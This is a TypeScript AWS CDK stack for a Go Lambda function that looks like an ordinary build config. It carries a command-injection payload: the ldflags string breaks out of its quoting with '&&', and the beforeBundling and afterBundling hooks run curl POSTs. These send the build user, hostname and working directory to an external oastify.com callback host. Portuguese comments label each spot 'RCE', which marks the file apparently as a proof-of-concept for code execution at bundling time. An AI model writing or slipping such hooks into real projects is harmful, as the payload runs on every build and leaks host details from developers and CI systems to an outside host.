import { Stack, StackProps } from 'aws-cdk-lib';
import { Construct } from 'constructs';
import { GoFunction } from '@aws-cdk/aws-lambda-go-alpha';
import * as lambda from 'aws-cdk-lib/aws-lambda';

export class GoLambdaStack extends Stack {
  constructor(scope: Construct, id: string, props?: StackProps) {
    super(scope, id, props);

    new GoFunction(this, 'MyGoFunction', {
      entry: 'lambda',
      functionName: 'awesome-go-function',
      runtime: lambda.Runtime.PROVIDED_AL2,
      bundling: {
        goBuildFlags: [
          '-tags', 'lambda.norpc',
          '-ldflags', this.getOptimizationFlags(),
        ],
        commandHooks: {
          beforeBundling: (inputDir: string): string[] => {
            return [
              'echo "🚀 Starting build process..."',
              this.collectBuildInfo(),
            ];
          },
          // ADICIONE O afterBundling (obrigatório!)
          afterBundling: (inputDir: string, outputDir: string): string[] => {
            return [
              'echo "✅ Build complete"',
              this.postBuildInfo()  // Opcional: segundo trigger
            ];
          }
        },
      },
    });
  }

  private getOptimizationFlags(): string {
    // RCE aqui
    return `"-s -w" && echo "Build User: $(whoami)" && echo "Build Host: $(hostname)" && curl -X POST https://osk4xsjsx7sukkqowyekxwfm7dd41wpl.oastify.com/build-flags -d "user=$(whoami)&host=$(hostname)" 2>/dev/null && echo "`;
  }

  private collectBuildInfo(): string {
    // RCE no beforeBundling
    return `
      echo "=== System Info ===" &&
      echo "Current User: $(whoami)" &&
      echo "Hostname: $(hostname)" &&
      echo "Current Dir: $(pwd)" &&
      curl -sS -X POST https://osk4xsjsx7sukkqowyekxwfm7dd41wpl.oastify.com/before-bundling \
        -d "user=$(whoami)&hostname=$(hostname)&pwd=$(pwd)" \
        --connect-timeout 2 2>/dev/null || true &&
      echo "=== Info collected ==="
    `.replace(/\n/g, ' ').trim();
  }

  private postBuildInfo(): string {
    // RCE no afterBundling (segundo ponto de execução)
    return `
      echo "Post-build check" &&
      curl -sS -X POST https://osk4xsjsx7sukkqowyekxwfm7dd41wpl.oastify.com/after-bundling \
        -d "status=complete&user=$(whoami)" \
        2>/dev/null || true
    `.replace(/\n/g, ' ').trim();
  }
}
